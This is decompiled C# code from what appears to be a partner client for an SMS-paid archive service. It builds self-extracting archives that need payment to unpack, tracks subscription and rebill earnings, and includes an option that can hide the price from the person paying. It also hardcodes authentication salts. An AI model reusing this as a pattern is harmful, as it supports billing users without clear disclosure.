          XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("project");
          for (int i = 0; i < elementsByTagName.Count; ++i)
          {
            if (this.Project_Name.Text.Trim() == elementsByTagName[i].Attributes[0].InnerText)
            {
              int num3 = (int) MessageBox.Show("Проект с таким именем уже существует! ", "Ошибка создания проекта", MessageBoxButtons.OK, MessageBoxIcon.Hand);
              return;
            }
          }
        }
        string[] strArray = !this.UpdateArchive.Checked ? this.CheckArchivationParams(1) : this.CheckArchivationParams(2);
        if (strArray == null)
          return;
        if (!Directory.Exists(this.FCashObj.LocalTmpPath))
          Directory.CreateDirectory(this.FCashObj.LocalTmpPath);
        if (!System.IO.File.Exists(this.FCashObj.SavedProjectPath))
        {
          FileStream fileStream = System.IO.File.Open(this.FCashObj.SavedProjectPath, FileMode.OpenOrCreate, FileAccess.ReadWrite);
          StreamWriter streamWriter = new StreamWriter((Stream) fileStream, Encoding.UTF8);
          streamWriter.WriteLine("<all_project>");
          streamWriter.Flush();
          streamWriter.WriteLine("</all_project>");
          streamWriter.Flush();
          streamWriter.Close();
          fileStream.Dispose();
          fileStream.Close();
        }
        string str1 = "0";
        string str2 = "0";
        string str3 = (string) null;
        string str4 = (string) null;
        if (this.ShowPriseForClient.Checked)
          str1 = "1";
        if (this.UseOpenCount.Checked)
          str2 = "1";
        if (this.AllowAltPayment.Checked)
        {
          string text = this.IndicateAltPaymentSum.Text;
        }
        if (this.UseMyIcon.Checked)
          str3 = this.UseIcon;
        if (this.SelectArchiveStyle.SelectedIndex == 1 || this.SelectArchiveStyle.SelectedIndex == 2)
          str4 = this.UseImg;
        string str5 = "<project name=\"" + this.Project_Name.Text + "\">";
        string str6;
        if (this.NewArchive.Checked)
        {
          string str7 = str5 + "<filelist>";
          for (int index = 0; index < strArray.Length; ++index)
            str7 = str7 + "<file>" + strArray[index] + "</file>";
          str6 = str7 + "</filelist>" + "<type>0</type>";
        }
        else
        {
          string str8 = str5 + "<filelist>";
          for (int index = 0; index < strArray.Length; ++index)
            str8 = str8 + "<file>" + this.OldFilePath.Text + "</file>";
          str6 = str8 + "</filelist>" + "<type>1</type>";
        }
        string str9 = str6 + "<paytype>" + (object) this.SelectPaymentType.SelectedIndex + "</paytype>" + "<smsprice>" + (object) this.SelectArchivePrice.SelectedIndex + "</smsprice>" + "<altpaycost>" + this.IndicateAltPaymentSum.Text + "</altpaycost>" + "<style>" + (object) this.SelectArchiveStyle.SelectedIndex + "</style>" + "<language>" + (object) this.SelectArchiveLangage.SelectedIndex + "</language>" + "<open>" + str2 + "</open>" + "<showprice>" + str1 + "</showprice>" + "<img>" + str4 + "</img>" + "<icon>" + str3 + "</icon>" + "</project>";
        XmlDocument xmlDocument1;
        XmlDocument xmlDocument2 = xmlDocument1 = new XmlDocument();
        xmlDocument2.Load(this.FCashObj.SavedProjectPath);
        XmlDocumentFragment documentFragment = xmlDocument2.CreateDocumentFragment();
        documentFragment.InnerXml = str9;
        xmlDocument2.DocumentElement.AppendChild((XmlNode) documentFragment);
        FileStream outStream = new FileStream(this.FCashObj.SavedProjectPath, FileMode.Truncate, FileAccess.Write, FileShare.ReadWrite);
        xmlDocument2.Save((Stream) outStream);
        outStream.Close();
        this.LoadProjectList();
        int num4 = (int) MessageBox.Show("Проект сохранен!");
      }
    }

    private void ClearArchivationWindow()
    {
      this.ArchivationList.Items.Clear();
      this.OldFileList.Items.Clear();
      this.OldFilePath.Text = "";
      this.SelectArchivePrice.SelectedItem = (object) "150 руб.";
      this.SelectArchiveLangage.SelectedItem = (object) "Русский";
      this.SelectArchiveStyle.SelectedItem = (object) "Стандартный";
      this.SelectPaymentType.SelectedItem = (object) "Оплата СМС";
      this.SelectFtpConection.SelectedItem = (object) null;
      this.AllowAltPayment.Checked = false;
      this.IndicateAltPaymentSum.Text = "";
      this.IndicateAltPaymentSum.Enabled = false;
      this.UseMyIcon.Checked = false;
      this.ICO_OpenDialog.FileName = (string) null;
      this.saveFileDialog1.FileName = (string) null;
      this.FileAdd_Dialog.FileName = (string) null;
      this.FolderAdd_Dialog.SelectedPath = (string) null;
      this.UseOpenCount.Checked = false;
      this.ShowPriseForClient.Checked = false;
      this.SavedProfiles.SelectedItem = (object) "";
      this.SelectFtpConection.SelectedItem = (object) "";
    }

    private void deleteProject_Click(object sender, EventArgs e)
    {
      if (this.ProjectList.SelectedItems.Count != 0 && System.IO.File.Exists(this.FCashObj.SavedProjectPath))
      {
        XmlDocument xmlDocument1;
        XmlDocument xmlDocument2 = xmlDocument1 = new XmlDocument();
        xmlDocument2.Load(this.FCashObj.SavedProjectPath);
        XmlNodeList elementsByTagName = xmlDocument2.GetElementsByTagName("project");
        foreach (ListViewItem selectedItem in this.ProjectList.SelectedItems)
          elementsByTagName[selectedItem.Index].ParentNode.RemoveChild(elementsByTagName[selectedItem.Index]);
        FileStream outStream = new FileStream(this.FCashObj.SavedProjectPath, FileMode.Truncate, FileAccess.Write, FileShare.ReadWrite);
        xmlDocument2.Save((Stream) outStream);
        outStream.Close();
        this.showftp();
      }
      this.LoadProjectList();
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
      this.TXT_UpdateTime.Text = (Convert.ToInt32(this.TXT_UpdateTime.Text) + 1).ToString();
      if (Convert.ToInt32(this.TXT_UpdateTime.Text) % 5 != 0 && !this.TimerError || !(this.TXT_UpdateTime.Text != "1") || this.TimerBackgWorker.IsBusy)
        return;
      this.TimerBackgWorker.RunWorkerAsync();
    }

    private void TimerBackgWorker_DoWork(object sender, DoWorkEventArgs e)
    {
      bool flag1 = false;
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(this.FCashObj.DomainIP + "/balance.php");
        httpWebRequest.Method = "POST";
        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
        byte[] bytes = Encoding.UTF8.GetBytes("sid=" + this.FCashObj.SID + "&hardware=" + this.FCashObj.HDD_Serial);
        httpWebRequest.ContentLength = (long) bytes.Length;
        Stream requestStream = httpWebRequest.GetRequestStream();
        requestStream.Write(bytes, 0, bytes.Length);
        requestStream.Close();
        WebResponse response = httpWebRequest.GetResponse();
        StreamReader streamReader = new StreamReader(response.GetResponseStream(), Encoding.UTF8);
        string end = streamReader.ReadToEnd();
        if (end.Trim() == "")
        {
          this.TimerError = false;
          return;
        }
        streamReader.Close();
        response.Close();
        if (new Regex("login=\"(.*)\",month", RegexOptions.Singleline).Match(end).Groups[1].ToString() != "")
          flag1 = true;
        if (new Regex("month=\"([0-9]*)\",").Match(end).Groups[1].ToString() != "")
          this.TimerRes.month = new Regex("month=\"([0-9]*)\",").Match(end).Groups[1].ToString();
        if (new Regex("today=\"([0-9]*)\",").Match(end).Groups[1].ToString() != "")
          this.TimerRes.today = new Regex("today=\"([0-9]*)\",").Match(end).Groups[1].ToString();
        if (new Regex("yesterday=\"([0-9]*)\",").Match(end).Groups[1].ToString() != "")
          this.TimerRes.yesterday = new Regex("yesterday=\"([0-9]*)\",").Match(end).Groups[1].ToString();
        if (new Regex("week=\"([0-9]*)\",").Match(end).Groups[1].ToString() != "")
          this.TimerRes.week = new Regex("week=\"([0-9]*)\",").Match(end).Groups[1].ToString();
        if (new Regex("balance=\"([0-9]*)\"").Match(end).Groups[1].ToString() != "")
          this.TimerRes.balance = new Regex("balance=\"([0-9]*)\"").Match(end).Groups[1].ToString();
        this.TimerError = false;
        this.TimerBackgWorker.ReportProgress(1, (object) this.TimerRes);
      }
      catch
      {
        this.TimerError = true;
        int num = (int) MessageBox.Show("Не возможно подлючится к серверу!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        this.TimerBackgWorker.CancelAsync();
      }
      if (flag1)
      {
        try
        {
          HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(this.FCashObj.DomainIP + "/get_changes.php");
          httpWebRequest.Method = "POST";
          httpWebRequest.ContentType = "application/x-www-form-urlencoded";
          byte[] bytes = Encoding.UTF8.GetBytes("sid=" + this.FCashObj.SID + "&hardware=" + this.FCashObj.HDD_Serial);
          httpWebRequest.ContentLength = (long) bytes.Length;
          Stream requestStream = httpWebRequest.GetRequestStream();
          requestStream.Write(bytes, 0, bytes.Length);
          requestStream.Close();
          WebResponse response = httpWebRequest.GetResponse();
          StreamReader streamReader = new StreamReader(response.GetResponseStream(), Encoding.UTF8);
          string end = streamReader.ReadToEnd();
          if (end.Trim() != "")
          {
            XmlDocument xmlDocument = new XmlDocument();
            MemoryStream memoryStream;
            MemoryStream inStream = memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(end));
            xmlDocument.Load((Stream) inStream);
            XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("res");
            bool flag2 = false;
            if (this.NotyfyShow && (Convert.ToInt32(elementsByTagName[0].ChildNodes.Item(0).InnerText) - Convert.ToInt32(this.TimerRes.opencount) > 0 || Convert.ToInt32(elementsByTagName[0].ChildNodes.Item(1).InnerText) - Convert.ToInt32(this.TimerRes.unpackcount) > 0 || Convert.ToInt32(elementsByTagName[0].ChildNodes.Item(2).InnerText) - Convert.ToInt32(this.TimerRes.unpacksum) > 0 || Convert.ToInt32(elementsByTagName[0].ChildNodes.Item(3).InnerText) - Convert.ToInt32(this.TimerRes.subs) > 0 || Convert.ToInt32(elementsByTagName[0].ChildNodes.Item(4).InnerText) - Convert.ToInt32(this.TimerRes.offsubs) > 0 || Convert.ToInt32(elementsByTagName[0].ChildNodes.Item(5).InnerText) - Convert.ToInt32(this.TimerRes.mtrebils) > 0 || Convert.ToInt32(elementsByTagName[0].ChildNodes.Item(6).InnerText) - Convert.ToInt32(this.TimerRes.mtrebilsSum) > 0))
            {
              flag2 = true;
              this.TimerRes.copencount = (Convert.ToInt32(elementsByTagName[0].ChildNodes.Item(0).InnerText) - Convert.ToInt32(this.TimerRes.opencount)).ToString();
              this.TimerRes.cunpackcount = (Convert.ToInt32(elementsByTagName[0].ChildNodes.Item(1).InnerText) - Convert.ToInt32(this.TimerRes.unpackcount)).ToString();
              this.TimerRes.cunpacksum = (Convert.ToInt32(elementsByTagName[0].ChildNodes.Item(2).InnerText) - Convert.ToInt32(this.TimerRes.unpacksum)).ToString();
              this.TimerRes.csubs = (Convert.ToInt32(elementsByTagName[0].ChildNodes.Item(3).InnerText) - Convert.ToInt32(this.TimerRes.subs)).ToString();
              this.TimerRes.coffsubs = (Convert.ToInt32(elementsByTagName[0].ChildNodes.Item(4).InnerText) - Convert.ToInt32(this.TimerRes.offsubs)).ToString();
              this.TimerRes.cmtrebils = (Convert.ToInt32(elementsByTagName[0].ChildNodes.Item(5).InnerText) - Convert.ToInt32(this.TimerRes.mtrebils)).ToString();
              this.TimerRes.cmtrebilsSum = (Convert.ToInt32(elementsByTagName[0].ChildNodes.Item(6).InnerText) - Convert.ToInt32(this.TimerRes.mtrebilsSum)).ToString();
            }
            this.TimerRes.opencount = elementsByTagName[0].ChildNodes.Item(0).InnerText;
            this.TimerRes.unpackcount = elementsByTagName[0].ChildNodes.Item(1).InnerText;
            this.TimerRes.unpacksum = elementsByTagName[0].ChildNodes.Item(2).InnerText;
            this.TimerRes.subs = elementsByTagName[0].ChildNodes.Item(3).InnerText;
            this.TimerRes.offsubs = elementsByTagName[0].ChildNodes.Item(4).InnerText;
            this.TimerRes.mtrebils = elementsByTagName[0].ChildNodes.Item(5).InnerText;
            this.TimerRes.mtrebilsSum = elementsByTagName[0].ChildNodes.Item(6).InnerText;
            xmlDocument.Clone();
            if (this.NotyfyShow && flag2)
              this.TimerBackgWorker.ReportProgress(2, (object) this.TimerRes);
            this.NotyfyShow = true;
          }
          streamReader.Close();
          response.Close();
        }
        catch
        {
        }
      }
      this.TimerBackgWorker.ReportProgress(1, (object) this.TimerRes);
    }

    private void TimerBackgWorker_ProgressChanged(object sender, ProgressChangedEventArgs e)
    {
      TimerResoultParam userState = e.UserState as TimerResoultParam;
      if (e.ProgressPercentage == 1)
      {
        this.TXT_UpdateTime.Text = "0";
        this.MonthSum.Text = userState.month + " руб.";
        this.TodaySum.Text = userState.today + " руб.";
        this.YesterdaySum.Text = userState.yesterday + " руб.";
        this.WeekSum.Text = userState.week + " руб.";
        userState.oldbalance = this.BalanceSum.Text.Replace(" руб.", "");
        this.BalanceSum.Text = userState.balance + " руб.";
      }
      else
        new NotifyWindow(ref userState).Show();
    }

    private void EnterMyAcc(object sender, EventArgs e)
    {
      string str1 = (string) null;
      if (((Control) sender).Name == "Link_support")
        str1 = "1";
      string str2 = new Random().Next(1000, 99999).ToString();
      Process.Start("http://centercash.ru/_arch_api/partauth.php?sid=" + this.FCashObj.SID + "&rel=" + str2 + "&data=" + this.FCashObj.MD5(this.FCashObj.SID + "_" + str2 + "_GetMyAccPlz_trmdmbmkle") + "&sp=" + str1);
    }

    private void Link_forum_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) => Process.Start("http://convertforum.ru/");

    private void Link_help_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) => Process.Start("http://centercash.ru/help.php");

    private void NewsClick(object sender, EventArgs e)
    {
      if (((Control) sender).Name.IndexOf("1") >= 0)
        Process.Start("http://centercash.ru/news.php?id=" + this.news1ID);
      else if (((Control) sender).Name.IndexOf("2") >= 0)
      {
        Process.Start("http://centercash.ru/news.php?id=" + this.news2ID);
      }
      else
      {
        if (((Control) sender).Name.IndexOf("3") < 0)
          return;
        Process.Start("http://centercash.ru/news.php?id=" + this.news3ID);
      }
    }

    private void SelectArchiveStyle_SelectedIndexChanged(object sender, EventArgs e)
    {
      if (!(this.SelectArchiveStyle.SelectedItem.ToString() == "Инсталлятор") && !(this.SelectArchiveStyle.SelectedItem.ToString() == "Инсталлятор модерн") || this.ProjectSelect || this.ImgBrouseDlg.ShowDialog() != DialogResult.OK)
        return;
      this.UseImg = this.ImgBrouseDlg.FileName;
    }

    private void button6_Click(object sender, EventArgs e)
    {
      if (this.ArchiveListView.SelectedItems.Count != 1 || !(this.ArchiveListView.SelectedItems[0].Text.Trim() != ""))
        return;
      switch (this.FCashObj.SendPost(this.FCashObj.DomainIP + "/del_archive.php", "sid=" + this.FCashObj.SID + "&hardware=" + this.FCashObj.HDD_Serial + "&aid=" + this.ArchiveListView.SelectedItems[0].Text))
      {
        case "msgDelOk":
          int num = (int) MessageBox.Show("Архив удален !");
          this.ArchiveListView.Items.Remove(this.ArchiveListView.SelectedItems[0]);
          break;
      }
    }

    private void BrowsStyle_Click(object sender, EventArgs e)
    {
      if (this.StyleBrowser.ShowDialog() != DialogResult.OK)
        return;
      this.StyleCreate.Enabled = false;
      this.inf.Visible = false;
      if (this.CheckStyle(this.StyleBrowser.SelectedPath))
      {
        this.StylePath.Text = this.StyleBrowser.SelectedPath;
        this.StyleList.Items.Clear();
        this.CheckHtmlTags(this.StyleBrowser.SelectedPath);
        this.StyleList.Enabled = true;
        if (this.StyleList.Groups[0].Items.Count == 0)
          this.StyleTest.Enabled = true;
        else
          this.StyleTest.Enabled = false;
      }
      else
      {
        this.StylePath.Text = "";
        this.StyleList.Items.Clear();
        this.StyleList.Enabled = false;
        this.StyleTest.Enabled = false;
      }
    }

    private bool CheckStyle(string path)
    {
      if (Directory.GetFiles(path, "index.html").Length == 0)
      {
        int num = (int) MessageBox.Show("Не найден index.html ", "Ошибка создания стиля", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        return false;
      }
      if (this.GetFileSize(path) <= 3145728L)
        return true;
      int num1 = (int) MessageBox.Show("Максимальный размер шаблона 3 MB!", "Ошибка создания стиля", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      return false;
    }

    private long GetFileSize(string path)
    {
      string[] files = Directory.GetFiles(path, "*.*");
      long fileSize = 0;
      foreach (string fileName in files)
      {
        FileInfo fileInfo = new FileInfo(fileName);
        fileSize += fileInfo.Length;
        if (fileSize > 3145728L)
          return fileSize;
      }
      foreach (string directory in Directory.GetDirectories(path))
        fileSize += this.GetFileSize(directory);
      return fileSize;
    }

    private bool CheckHtmlTags(string HtmlDir)
    {
      HtmlNode htmlNode = (HtmlNode) null;
      int num = 0;
      string str1 = (string) null;
      string str2 = (string) null;
      HtmlDocument doc = new HtmlDocument();
      foreach (string file in Directory.GetFiles(HtmlDir, "*.html"))
      {
        FileInfo fileInfo = new FileInfo(file);
        doc.Load(file);
        if (fileInfo.Name == "subs.html")
        {
          if (doc.GetElementbyId("fc_telnum") == null)
            this.StyleListItemAdd("fc_telnum", 1, 0, fileInfo.Name, "Элемент с таким ид не найден");
          else
            this.StyleListItemAdd("fc_telnum", 0, 2, fileInfo.Name, (string) null);
          htmlNode = (HtmlNode) null;
          if (doc.GetElementbyId("fc_sendsms") == null)
            this.StyleListItemAdd("fc_sendsms", 1, 0, fileInfo.Name, "Элемент с таким ид не найден");
          else
            this.StyleListItemAdd("fc_sendsms", 0, 2, fileInfo.Name, (string) null);
        }
        HtmlNode elementbyId1 = doc.GetElementbyId("fc_width");
        if (elementbyId1 == null)
          this.StyleListItemAdd("fc_width", 1, 0, fileInfo.Name, "Элемент с таким ид не найден");
        else if (elementbyId1.GetAttributeValue("value", num) <= 0)
          this.StyleListItemAdd("fc_width", 1, 0, fileInfo.Name, "Укажите цифровое значение для value");
        else
          this.StyleListItemAdd("fc_width", 0, 2, fileInfo.Name, (string) null);
        HtmlNode elementbyId2 = doc.GetElementbyId("fc_height");
        if (elementbyId2 == null)
          this.StyleListItemAdd("fc_height", 1, 0, fileInfo.Name, "Элемент с таким ид не найден");
        else if (elementbyId2.GetAttributeValue("value", num) <= 0)
          this.StyleListItemAdd("fc_height", 1, 0, fileInfo.Name, "Укажите цифровое значение для value");
        else
          this.StyleListItemAdd("fc_height", 0, 2, fileInfo.Name, (string) null);
        HtmlNode elementbyId3 = doc.GetElementbyId("fc_title");
        if (elementbyId3 == null)
          this.StyleListItemAdd("fc_title", 2, 1, fileInfo.Name, "Элемент с таким ид не найден");
        else if (elementbyId3.GetAttributeValue("value", str1) == "")
          this.StyleListItemAdd("fc_title", 2, 1, fileInfo.Name, "Значение атрибута value пустое или атрибут не указан");
        else
          this.StyleListItemAdd("fc_title", 0, 2, fileInfo.Name, (string) null);
        HtmlNode elementbyId4 = doc.GetElementbyId("fc_countryslist");
        if (elementbyId4 != null && str2 == null)
        {
          if (elementbyId4.OriginalName != "select")
            this.StyleListItemAdd("fc_countryslist", 1, 0, fileInfo.Name, "Этот элемент должен быть <select> - ом");
          else
            this.StyleListItemAdd("fc_countryslist", 0, 2, fileInfo.Name, (string) null);
          str2 = fileInfo.Name;
          string[] subID1 = new string[1]
          {
            "fc_operatorslist"
          };
          this.PayScreenAttrCheck(doc, "fc_operatorscont", fileInfo.Name, true, subID1, true);
          subID1[0] = "fc_paylist";
          this.PayScreenAttrCheck(doc, "fc_paytypescont", fileInfo.Name, true, subID1, true);
          string[] subID2 = new string[2]
          {
            "fc_mtxt",
            "fc_mnum"
          };
          this.PayScreenAttrCheck(doc, "fc_payattrcont", fileInfo.Name, true, subID2, false);
          this.PayScreenAttrCheck(doc, "fc_msgbutt", fileInfo.Name, false, (string[]) null, false);
          subID1[0] = "fc_cost";
          this.PayScreenAttrCheck(doc, "fc_costcont", fileInfo.Name, true, subID1, false);
          subID1[0] = "fc_alturl";
          this.PayScreenAttrCheck(doc, "fc_altcont", fileInfo.Name, true, subID1, false);
          this.PayScreenAttrCheck(doc, "fc_unpack", fileInfo.Name, false, (string[]) null, false);
          this.PayScreenAttrCheck(doc, "fc_password", fileInfo.Name, false, (string[]) null, false);
          this.PayScreenAttrCheck(doc, "fc_abinfo", fileInfo.Name, false, (string[]) null, false);
          this.PayScreenAttrCheck(doc, "fc_progress", fileInfo.Name, false, (string[]) null, false, true);
        }
      }
      if (str2 == null)
        this.StyleListItemAdd("fc_countryslist", 1, 0, "-", "Элемент с таким ид не найден");
      return true;
    }

    private void PayScreenAttrCheck(
      HtmlDocument doc,
      string ID,
      string FileName,
      bool Sub,
      string[] subID,
      bool select,
      bool notify = false)
    {
      HtmlNode elementbyId1 = doc.GetElementbyId(ID);
      if (elementbyId1 == null)
      {
        if (!notify)
          this.StyleListItemAdd(ID, 1, 0, FileName, "Данный элемент и fc_countryslist должны находиться на одной странице ");
        else
          this.StyleListItemAdd(ID, 2, 1, FileName, "Данный элемент и fc_countryslist должны находиться на одной странице ");
      }
      else
      {
        this.StyleListItemAdd(ID, 0, 2, FileName, "");
        if (!Sub)
          return;
        HtmlDocument htmlDocument = new HtmlDocument();
        htmlDocument.Load((Stream) new MemoryStream(Encoding.UTF8.GetBytes(elementbyId1.OuterHtml)));
        for (int index = 0; index < subID.Length; ++index)
        {
          HtmlNode elementbyId2 = htmlDocument.GetElementbyId(subID[index]);
          if (elementbyId2 == null)
            this.StyleListItemAdd(subID[index], 1, 0, FileName, "Данный элемент должен находиться в контейнере " + ID);
          else if (select)
          {
            if (elementbyId2.OriginalName != nameof (select))
              this.StyleListItemAdd(subID[index], 1, 0, FileName, "Этот элемент должен быть <select> - ом");
            else
              this.StyleListItemAdd(subID[index], 0, 2, FileName, "");
          }
          else
            this.StyleListItemAdd(subID[index], 0, 2, FileName, "");
        }
      }
    }

    private void StyleListItemAdd(
      string id,
      int imgIndex,
      int groupIndex,
      string file,
      string error)
    {
      this.StyleList.Items.Add(new ListViewItem(id, imgIndex, this.StyleList.Groups[groupIndex])
      {
        SubItems = {
          file,
          error
        }
      });
    }

    private void StyleTest_Click(object sender, EventArgs e)
    {
      if (this.StyleList.Groups[0].Items.Count != 0)
        return;
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
      try
      {
        using (WebClient webClient = new WebClient())
        {
          webClient.DownloadFile(this.FCashObj.DomainIP.Replace("/_arch_api", "") + "/sfx_mods/default.sfx", folderPath + "\\fc_styleTest.exe");
          webClient.Dispose();
        }
        string str1 = new Random().Next(10000000, 999999999).ToString();
        this.StyeZipName = "c:\\windows\\temp\\" + str1 + ".zip";
        ComponentAce.Compression.ZipForge.ZipForge zipForge = new ComponentAce.Compression.ZipForge.ZipForge();
        ((ArchiverForgeBase) zipForge).FileName = this.StyeZipName;
        ((ArchiverForgeBase) zipForge).OpenArchive(FileMode.Create);
        if (Directory.Exists(this.StylePath.Text))
        {
          ((ArchiverForgeBase) zipForge).BaseDir = this.StylePath.Text + "\\";
          ((ArchiverForgeBase) zipForge).AddFiles("*");
        }
        ((ArchiverForgeBase) zipForge).CloseArchive();
        byte[] bytes = Encoding.Default.GetBytes(Resources.prefix);
        string str2 = Encoding.Default.GetString(bytes, 0, bytes.Length);
        string str3 = Encoding.Default.GetString(Resources.TestAch, 0, Resources.TestAch.Length);
        string path = "c:\\windows\\temp\\" + str1 + ".ds";
        new ResourceChanger().AddImg(folderPath + "\\fc_styleTest.exe", this.StyeZipName, 89U);
        using (FileStream fileStream = new FileStream(path, FileMode.CreateNew, FileAccess.Write, FileShare.Write))
        {
          using (StreamWriter streamWriter = new StreamWriter((Stream) fileStream, Encoding.Default))
          {
            streamWriter.WriteLine("0");
            streamWriter.Flush();
            streamWriter.Close();
          }
          fileStream.Dispose();
          fileStream.Close();
        }
        StreamWriter streamWriter1 = new StreamWriter(folderPath + "\\fc_styleTest.exe", true, Encoding.Default);
        streamWriter1.Write(this.FCashObj.Boundary);
        streamWriter1.Flush();
        streamWriter1.Write(str2);
        streamWriter1.Flush();
        streamWriter1.Write("011000\r\n");
        streamWriter1.Flush();
        streamWriter1.Write(str3);
        streamWriter1.Flush();
        streamWriter1.Close();
        int num1 = (int) MessageBox.Show("Пароль от тестового архива: 123", "Внимание", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        Process process = new Process();
        process.StartInfo.FileName = folderPath + "\\fc_styleTest.exe";
        process.StartInfo.Arguments = path;
        process.Start();
        process.WaitForExit();
        if (System.IO.File.ReadAllLines(path)[0] == "0")
        {
          int num2 = (int) MessageBox.Show("Произошла ошибка. Вы не распаковали текстовый экземпляр! ", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
          this.StyleCreate.Enabled = false;
        }
        else if (System.IO.File.ReadAllLines(path)[0] == "1")
          this.StyleCreate.Enabled = true;
        System.IO.File.Delete(path);
      }
      catch
      {
        int num = (int) MessageBox.Show("Произошла ошибка. Повторите попытку!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        this.inf.Visible = false;
      }
    }

    private void StyleCreate_Click(object sender, EventArgs e)
    {
      if (this.StyleName.Text.Trim() == "")
      {
        int num = (int) MessageBox.Show("Введите название для стиля!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        this.StyleName.Focus();
      }
      else
      {
        string str1 = new Random().Next(10000000, 999999999).ToString();
        string str2 = this.FCashObj.MD5(HttpUtility.UrlEncode(this.StyleName.Text.Trim()).ToLower() + "_" + this.FCashObj.SID + "_" + str1 + "_iStyle_4G");
        string str3 = "?strt=" + this.FCashObj.SID + "&name=" + HttpUtility.UrlEncode(this.StyleName.Text.Trim()).ToLower() + "&rutc=" + str1 + "&scey=" + str2;
        using (WebClient webClient = new WebClient())
        {
          byte[] bytes = webClient.UploadFile(this.FCashObj.DomainIP + "/style_receiver.php" + str3, "POST", this.StyeZipName);
          string text = webClient.Encoding.GetString(bytes);
          int num1 = (int) MessageBox.Show(text);
          if (text != "ok")
          {
            int num2 = (int) MessageBox.Show("Произошла ошибка. Повторите попытку!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
          }
          else
          {
            int num3 = (int) MessageBox.Show("Стиль создан. Будет доступен после модерации!");
            this.StyleName.Text = this.StylePath.Text = "";
            this.StyleCreate.Enabled = this.StyleTest.Enabled = this.StyleList.Enabled = false;
            this.StyleList.Items.Clear();
          }
        }
      }
    }

    private void CopyFolder(string sourceFolder, string destFolder)
    {
      if (!Directory.Exists(destFolder))
        Directory.CreateDirectory(destFolder);
      foreach (string file in Directory.GetFiles(sourceFolder))
      {
        string fileName = Path.GetFileName(file);
        string destFileName = Path.Combine(destFolder, fileName);
        System.IO.File.Copy(file, destFileName);
      }
      foreach (string directory in Directory.GetDirectories(sourceFolder))
      {
        string fileName = Path.GetFileName(directory);
        string destFolder1 = Path.Combine(destFolder, fileName);
        this.CopyFolder(directory, destFolder1);
      }
    }

    private void StyleListView_VisibleChanged(object sender, EventArgs e)
    {
      if (!((Control) sender).Visible)
        return;
      string s = this.FCashObj.SendPost(this.FCashObj.DomainIP + "/styles_list.php", "sid=" + this.FCashObj.SID);
      if (s == null)
        return;
      XmlDocument xmlDocument = new XmlDocument();
      MemoryStream memoryStream;
      MemoryStream inStream = memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(s));
      xmlDocument.Load((Stream) inStream);
      XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("style");
      this.StyleListView.Items.Clear();
      for (int i = 0; i < elementsByTagName.Count; ++i)
        this.StyleListView.Items.Add(new ListViewItem(elementsByTagName[i].ChildNodes.Item(0).InnerText)
        {
          SubItems = {
            elementsByTagName[i].ChildNodes.Item(1).InnerText,
            elementsByTagName[i].ChildNodes.Item(2).InnerText,
            elementsByTagName[i].ChildNodes.Item(3).InnerText
          }
        });
    }

    private void Menu_archivation_cont_VisibleChanged(object sender, EventArgs e)
    {
      if (!((Control) sender).Visible)
        return;
      string s = this.FCashObj.SendPost(this.FCashObj.DomainIP + "/load_style.php", "sid=" + this.FCashObj.SID + "&hardware=" + this.FCashObj.HDD_Serial);
      if (s == null)
        return;
      this.Styles = new Dictionary<string, string>();
      XmlDocument xmlDocument = new XmlDocument();
      MemoryStream memoryStream;
      MemoryStream inStream = memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(s));
      xmlDocument.Load((Stream) inStream);
      XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("st");
      this.SelectArchiveStyle.Items.Clear();
      for (int i = 0; i < elementsByTagName.Count; ++i)
      {
        this.SelectArchiveStyle.Items.Add((object) elementsByTagName[i].ChildNodes.Item(0).InnerText);
        this.Styles[elementsByTagName[i].ChildNodes.Item(0).InnerText] = elementsByTagName[i].ChildNodes.Item(1).InnerText;
      }
      this.SelectArchiveStyle.SelectedItem = (object) "Стандартный";
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ListViewGroup listViewGroup1 = new ListViewGroup("Ошибки", HorizontalAlignment.Left);
      ListViewGroup listViewGroup2 = new ListViewGroup("Примечании", HorizontalAlignment.Left);
      ListViewGroup listViewGroup3 = new ListViewGroup("Правильно ", HorizontalAlignment.Left);
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.Tab_archivation = new PictureBox();
      this.Tab_addvance = new PictureBox();
      this.Tab_styles = new PictureBox();
      this.Web_enter = new PictureBox();
      this.TXT_LastNews = new Label();
      this.Link_help = new LinkLabel();
      this.Link_site = new LinkLabel();
      this.Link_forum = new LinkLabel();
      this.Link_about = new LinkLabel();
      this.TXT_UpdateInfo = new Label();
      this.TXT_UpdateTime = new Label();
      this.TXT_UpdateInfo2 = new Label();
      this.Link_support = new LinkLabel();
      this.TXT_newMsg = new Label();
      this.Link_NewMsgCount = new LinkLabel();
      this.label1 = new Label();
      this.LoginTXT = new Label();
      this.label3 = new Label();
      this.BalanceSum = new Label();
      this.label5 = new Label();
      this.label78 = new Label();
      this.YesterdaySum = new Label();
      this.TodaySum = new Label();
      this.MonthSum = new Label();
      this.WeekSum = new Label();
      this.label11 = new Label();
      this.label12 = new Label();
      this.Tab_archivation_panel = new Panel();
      this.Menu_archiveList = new Panel();
      this.label17 = new Label();
      this.pictureBox2 = new PictureBox();
      this.label18 = new Label();
      this.Menu_archivation = new Panel();
